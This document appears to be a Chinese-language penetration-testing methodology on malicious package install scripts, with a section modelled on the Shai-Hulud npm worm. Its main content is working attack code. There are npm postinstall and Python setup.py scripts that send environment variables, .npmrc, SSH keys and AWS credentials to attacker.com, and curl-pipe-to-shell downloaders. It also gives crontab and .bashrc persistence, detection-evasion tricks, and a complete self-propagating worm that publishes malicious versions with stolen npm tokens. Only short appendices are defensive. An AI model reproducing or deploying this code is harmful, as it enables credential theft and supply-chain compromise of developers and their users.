# 恶意脚本执行方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供恶意脚本执行攻击的系统化方法
- 指导测试人员识别和利用包管理器中的脚本执行机制
- 帮助理解 npm、pip 等包安装过程中的脚本执行风险
- 补充 Shai-Hulud npm 蠕虫等自我传播攻击技术

## 1.2 适用范围
- 适用于使用 npm、pip、Gem、Composer 等包管理器的场景
- 适用于有 postinstall、preinstall 等生命周期脚本的包
- 适用于自动化安装依赖的 CI/CD 流程
- 适用于 npm 生态系统的供应链攻击场景

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- 应用开发人员
- DevSecOps 工程师

---

# 第二部分：核心渗透技术专题

## 专题一：恶意脚本执行

### 2.1 技术介绍

恶意脚本执行攻击是指攻击者通过在软件包中嵌入恶意安装脚本（如 npm 的 postinstall、pip 的 setup.py 等），当用户安装该包时，恶意脚本自动执行，从而实现代码执行、凭证窃取、后门植入等攻击目的。

**脚本执行机制：**

```
┌─────────────────────────────────────────────────────────────┐
│                  npm 生命周期脚本执行流程                     │
├─────────────────────────────────────────────────────────────┤
│  npm install                                                │
│    ↓                                                        │
│  preinstall (安装前执行)                                     │
│    ↓                                                        │
│  install (安装时执行)                                        │
│    ↓                                                        │
│  postinstall (安装后执行) ← 恶意脚本常见位置                 │
│    ↓                                                        │
│  prepublish (发布前执行)                                     │
│    ↓                                                        │
│  prepare (准备阶段执行)                                      │
└─────────────────────────────────────────────────────────────┘
```

**常见恶意脚本类型：**

| 脚本类型 | 触发时机 | 风险等级 |
|---------|---------|---------|
| postinstall | 包安装完成后 | 严重 |
| preinstall | 包安装开始前 | 严重 |
| install | 包安装过程中 | 严重 |
| prepare | 包准备阶段 | 高 |
| prepublish | 包发布前 | 高 |
| setup.py install | Python 包安装 | 严重 |
| post_install | Ruby Gem 安装 | 高 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| npm 包安装 | npm install | postinstall 脚本自动执行 |
| Python 包安装 | pip install | setup.py 中的代码执行 |
| 依赖自动安装 | CI/CD 自动安装依赖 | 无人工审核 |
| 开源项目克隆 | git clone + npm install | 直接运行项目安装脚本 |
| 包更新 | npm update | 更新后恶意脚本执行 |
| Docker 构建 | RUN npm install | 构建时执行恶意脚本 |

**高风险特征：**
- 包包含 postinstall 脚本
- 脚本执行网络请求
- 脚本访问文件系统
- 脚本执行系统命令
- 包下载量低但功能敏感

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：检查 package.json 脚本**
```bash
# 检查包的 scripts 字段
curl https://registry.npmjs.org/package-name/latest
# 或
npm view package-name --json | jq '.scripts'

# 检查危险脚本
{
  "scripts": {
    "postinstall": "node scripts/postinstall.js",  // 高风险
    "install": "bash install.sh",  // 高风险
    "prepare": "npm run build"
  }
}
```

**步骤二：检查 Python setup.py**
```bash
# 检查 setup.py 内容
curl https://pypi.org/pypi/package-name/json | jq '.urls[0].url'
wget <download_url>
tar -xzf package-name.tar.gz
cat setup.py

# 检查危险代码
grep -E "os\.system|subprocess|exec|eval|urllib|requests" setup.py
```

#### 2.3.2 白盒测试

**步骤一：审计 npm 包脚本**
```json
// 检查 package.json
{
  "scripts": {
    "postinstall": "node -e \"require('https').get('http://attacker.com/exfil?d=' + process.cwd())\""
  }
}

// 检查脚本文件内容
cat scripts/postinstall.js

// 查找敏感操作
grep -E "require\('child_process'\)|exec|spawn" scripts/*.js
grep -E "require\('https'\)|axios|request" scripts/*.js
grep -E "process\.env|SECRET|KEY|TOKEN" scripts/*.js
```

**步骤二：审计 Python 包**
```python
# 检查 setup.py
from setuptools import setup
import os
import subprocess

# 危险代码示例
os.system("curl http://attacker.com/backdoor.sh | sh")
subprocess.call(["wget", "http://attacker.com/malware"])

# 检查 pyproject.toml
cat pyproject.toml
# 检查 [build-system] 和 [tool.*] 配置
```

**步骤三：动态分析**
```bash
# 在沙箱环境中安装并监控
# 使用 strace 监控系统调用
strace -f npm install package-name 2>&1 | grep -E "connect|open|exec"

# 使用网络监控
tcpdump -i any -n port 80 or port 443

# 检查文件变化
npm install package-name
git status  # 查看修改的文件
```

### 2.4 漏洞利用方法

#### 2.4.1 npm postinstall 攻击

```json
// package.json
{
  "name": "legitimate-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
```

```javascript
// postinstall.js
const { exec } = require('child_process');
const https = require('https');

// 窃取环境变量
const env = JSON.stringify(process.env);
https.get(`http://attacker.com/exfil?env=${encodeURIComponent(env)}`);

// 执行系统命令
exec('curl http://attacker.com/backdoor.sh | sh');

// 写入后门
const fs = require('fs');
fs.writeFileSync('/tmp/.backdoor', 'malicious code');
```

#### 2.4.2 Python setup.py 攻击

```python
# setup.py
from setuptools import setup
import os
import platform
import urllib.request

# 窃取信息
info = {
    'cwd': os.getcwd(),
    'user': os.getlogin(),
    'platform': platform.system(),
    'env': dict(os.environ)
}

# 外带数据
urllib.request.urlopen(
    f"http://attacker.com/exfil?data={urllib.parse.quote(str(info))}"
)

# 执行命令
os.system("wget http://attacker.com/malware.py && python malware.py")

setup(
    name='legitimate-package',
    version='1.0.0',
    # ...
)
```

#### 2.4.3 凭证窃取

```javascript
// npm postinstall 窃取凭证
const fs = require('fs');
const https = require('https');

// 窃取 npm 凭证
try {
  const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');
  https.get(`http://attacker.com/exfil?npmrc=${encodeURIComponent(npmrc)}`);
} catch(e) {}

// 窃取 SSH 密钥
try {
  const sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
  https.get(`http://attacker.com/exfil?ssh=${encodeURIComponent(sshKey)}`);
} catch(e) {}

// 窃取 AWS 凭证
try {
  const awsCreds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
  https.get(`http://attacker.com/exfil?aws=${encodeURIComponent(awsCreds)}`);
} catch(e) {}
```

#### 2.4.4 持久化后门

```javascript
// 在用户配置中写入持久化后门
const fs = require('fs');
const path = require('path');

// 修改 .bashrc
const bashrc = path.join(process.env.HOME, '.bashrc');
fs.appendFileSync(bashrc, '\n# Backdoor\ncurl http://attacker.com/beacon\n');

// 修改 npm 全局配置
const npmrc = path.join(process.env.HOME, '.npmrc');
fs.appendFileSync(npmrc, '\n//attacker.com/:_authToken=stolen-token\n');

// 创建定时任务
const { exec } = require('child_process');
exec('echo "*/5 * * * * curl http://attacker.com/beacon" | crontab -');
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过脚本检测

```javascript
// 1. 代码混淆
const _0x1a2b = require('child_process');
_0x1a2b['exec']('malicious command');

// 2. 延迟执行
setTimeout(() => {
  require('child_process').exec('malicious command');
}, 60000);  // 1 分钟后执行

// 3. 条件触发
if (process.env.CI !== 'true' && process.env.NODE_ENV !== 'test') {
  // 只在非 CI/测试环境执行
  require('child_process').exec('malicious command');
}

// 4. 分阶段执行
// 第一次安装只执行 benign 代码
// 后续通过其他机制触发恶意代码
```

#### 2.5.2 绕过网络限制

```javascript
// 1. 使用 DNS 外带
const dns = require('dns');
dns.lookup(`$(whoami).attacker.com`, (err) => {});

// 2. 使用 HTTPS 加密
const https = require('https');
const data = Buffer.from('sensitive data').toString('base64');
https.get(`https://attacker.com/exfil?d=${data}`);

// 3. 使用常见域名伪装
// 使用 google-analytics.com 等常见域名
const https = require('https');
https.get('https://www.google-analytics.com/collect?data=...');
```

#### 2.5.3 绕过文件监控

```javascript
// 1. 写入临时目录
const os = require('os');
const path = require('path');
const tmpDir = os.tmpdir();
const backdoor = path.join(tmpDir, '.cache', 'update.js');

// 2. 使用隐藏文件
fs.writeFileSync('/tmp/.system-cache', 'malicious code');

// 3. 写入现有文件
fs.appendFileSync(process.env.HOME + '/.bashrc', '\n# benign comment\nmalicious code');
```

---

# 第三部分：附录

## 3.1 恶意脚本检测命令

```bash
# 检查 npm 包的 postinstall 脚本
npm view package-name scripts.postinstall

# 检查 package.json 完整内容
npm view package-name --json | jq '.scripts'

# 本地检查已安装包
cat node_modules/package-name/package.json | jq '.scripts'

# 批量检查所有依赖
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;
```

## 3.2 安全安装建议

| 措施 | 命令/配置 | 说明 |
|-----|---------|------|
| 禁用脚本 | `npm install --ignore-scripts` | 不执行任何生命周期脚本 |
| 只允许特定包 | `npm config set only-scripts package1,package2` | 白名单机制 |
| 审计脚本 | 手动检查 package.json | 安装前审查 |
| 使用锁文件 | 提交 package-lock.json | 确保版本一致 |
| 沙箱安装 | 在容器/VM 中安装 | 隔离风险 |

## 3.3 常见恶意脚本模式

| 模式 | 检测正则 | 风险等级 |
|-----|---------|---------|
| child_process | `require\(['"]child_process['"]\)` | 严重 |
| 网络请求 | `https?\.get\(|axios\.post\(` | 高 |
| 文件读取 | `fs\.readFileSync.*\.(pem|key|rc)` | 严重 |
| 命令执行 | `exec\(|spawn\(|system\(` | 严重 |
| 环境变量 | `process\.env\.[A-Z_]*KEY` | 高 |
| 编码隐藏 | `Buffer\.from.*base64` | 中 |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| npm audit | npm 内置安全审计 | npm 内置 |
| lockfile-lint | 锁文件完整性检查 | https://github.com/lirantal/lockfile-lint |
| audit-ci | CI 中的 npm audit | https://github.com/IBM/audit-ci |
| snyk | 依赖安全扫描 | https://snyk.io/ |

---

## 专题二：Shai-Hulud npm 蠕虫攻击技术

### 攻击概述
- **名称**：Shai-Hulud 供应链攻击（2025 年）
- **类型**：首个成功的自我传播 npm 蠕虫
- **影响**：传播超过 500 个包版本，被 npm 中断
- **意义**：开发者机器成为供应链攻击的主要目标

### 攻击原理

```
┌─────────────────────────────────────────────────────────────┐
│              Shai-Hulud npm 蠕虫传播机制                      │
├─────────────────────────────────────────────────────────────┤
│  1. 初始入侵                                                │
│     - 攻陷流行 npm 包或维护者账户                            │
│     - 发布包含恶意 postinstall 脚本的版本                    │
├─────────────────────────────────────────────────────────────┤
│  2. 数据窃取                                                │
│     - postinstall 脚本收集敏感数据                           │
│     - 外泄到公共 GitHub 仓库                                 │
│     - 窃取目标：.npmrc、SSH 密钥、.env 文件等                │
├─────────────────────────────────────────────────────────────┤
│  3. 凭证利用                                                │
│     - 检测受害者环境中的 npm tokens                          │
│     - 使用窃取的凭证访问 npm 账户                            │
│     - 获取可访问的包列表                                     │
├─────────────────────────────────────────────────────────────┤
│  4. 自我传播                                                │
│     - 自动推送恶意版本到窃取的包                             │
│     - 添加相同的 postinstall 脚本                            │
│     - 循环传播，感染更多用户                                 │
└─────────────────────────────────────────────────────────────┘
```

### 恶意脚本实现

```javascript
// postinstall.js - Shai-Hulud 风格蠕虫脚本
const https = require('https');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ========== 第一阶段：数据窃取 ==========

function stealSensitiveFiles() {
  const filesToSteal = [
    path.join(os.homedir(), '.npmrc'),
    path.join(os.homedir(), '.ssh', 'id_rsa'),
    path.join(os.homedir(), '.aws', 'credentials'),
    path.join(process.cwd(), '.env'),
    path.join(os.homedir(), '.git-credentials')
  ];
  
  let stolenData = {};
  
  filesToSteal.forEach(file => {
    try {
      const content = fs.readFileSync(file, 'utf8');
      stolenData[file] = content;
      
      // 外泄到攻击者服务器或 GitHub Gist
      exfiltrateData(file, content);
    } catch(e) {
      // 文件不存在，跳过
    }
  });
  
  return stolenData;
}

function exfiltrateData(filename, content) {
  const encoded = Buffer.from(content).toString('base64');
  
  // 方法 1：发送到攻击者服务器
  https.get(`https://attacker.com/exfil?f=${encodeURIComponent(filename)}&d=${encoded}`);
  
  // 方法 2：发送到 GitHub Gist（更隐蔽）
  // 使用窃取的 GitHub token
  const githubToken = process.env.GITHUB_TOKEN;
  if (githubToken) {
    const req = https.request({
      hostname: 'api.github.com',
      path: '/gists',
      method: 'POST',
      headers: {
        'Authorization': `token ${githubToken}`,
        'User-Agent': 'npm-package'
      }
    }, (res) => {});
    
    req.write(JSON.stringify({
      files: {
        [filename]: { content: content }
      }
    }));
    req.end();
  }
}

// ========== 第二阶段：凭证窃取与传播 ==========

function extractNpmTokens() {
  const tokens = {};
  
  // 从环境变量提取
  if (process.env.NPM_TOKEN) tokens.NPM_TOKEN = process.env.NPM_TOKEN;
  if (process.env.NODE_AUTH_TOKEN) tokens.NODE_AUTH_TOKEN = process.env.NODE_AUTH_TOKEN;
  
  // 从.npmrc 提取
  try {
    const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
    const tokenMatch = npmrc.match(/_authToken=(.+)/);
    if (tokenMatch) {
      tokens.authToken = tokenMatch[1];
    }
  } catch(e) {}
  
  return tokens;
}

function propagateWithStolenToken(token) {
  // 使用窃取的 token 获取可访问的包列表
  const req = https.request({
    hostname: 'registry.npmjs.org',
    path: '/-/orgs/-/package',
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Accept': 'application/json'
    }
  }, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
      try {
        const packages = JSON.parse(data);
        // 遍历可访问的包，发布恶意版本
        packages.forEach(pkg => {
          publishMaliciousVersion(pkg.name, token);
        });
      } catch(e) {}
    });
  });
  
  req.end();
}

function publishMaliciousVersion(packageName, token) {
  // 1. 下载当前包
  // 2. 添加恶意 postinstall 脚本
  // 3. 版本号增加 0.0.1-patch
  // 4. 发布新版本
  
  const maliciousPackageJson = {
    name: packageName,
    version: '1.0.1-patch',  // 小版本更新，不易察觉
    scripts: {
      postinstall: 'node .hooks/init.js'  // 恶意脚本
    }
  };
  
  // 使用窃取的 token 发布
  const req = https.request({
    hostname: 'registry.npmjs.org',
    path: `/${packageName}/-/${packageName}-1.0.1-patch.tgz`,
    method: 'PUT',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/octet-stream'
    }
  }, (res) => {
    if (res.statusCode === 200 || res.statusCode === 201) {
      console.log(`Successfully published malicious version of ${packageName}`);
    }
  });
  
  req.end();
}

// ========== 第三阶段：执行 ==========

// 延迟执行，绕过检测
setTimeout(() => {
  try {
    // 窃取数据
    const stolen = stealSensitiveFiles();
    
    // 提取凭证
    const tokens = extractNpmTokens();
    
    // 如果有 npm token，开始传播
    if (tokens.authToken || tokens.NPM_TOKEN) {
      const token = tokens.authToken || tokens.NPM_TOKEN;
      propagateWithStolenToken(token);
    }
  } catch(e) {
    // 静默失败，避免被发现
  }
}, 60000);  // 1 分钟后执行
```

### 传播特征

| 特征 | 描述 | 检测方法 |
|-----|------|---------|
| 快速传播 | 数小时内感染 500+ 包 | 监控 npm 发布频率 |
| 凭证窃取 | 窃取 npm、GitHub、AWS 凭证 | 监控异常网络请求 |
| 自我复制 | 自动发布恶意包版本 | 监控包发布来源 IP |
| 隐蔽执行 | 延迟执行、条件触发 | 行为监控、沙箱分析 |

### 防御措施

```bash
# 1. 禁用 postinstall 脚本
npm install --ignore-scripts

# 2. 使用锁定文件
# 确保只安装已知安全的版本

# 3. 启用双因素认证
# 保护 npm 和 GitHub 账户

# 4. 使用最小权限 token
# 限制 token 的包发布权限

# 5. 监控异常发布
# 设置包发布告警
```

---

## 参考资源

- [npm Scripts Documentation](https://docs.npmjs.com/cli/v6/using-npm/scripts)
- [Malicious npm Packages](https://snyk.io/blog/malicious-packages-in-the-npm-ecosystem/)
- [Supply Chain Attacks via Build Scripts](https://blog.npmjs.org/post/175691388105/malicious-packages-found-on-the-npm-registry)
- [OWASP Supply Chain Security](https://owasp.org/www-project-supply-chain-security/)
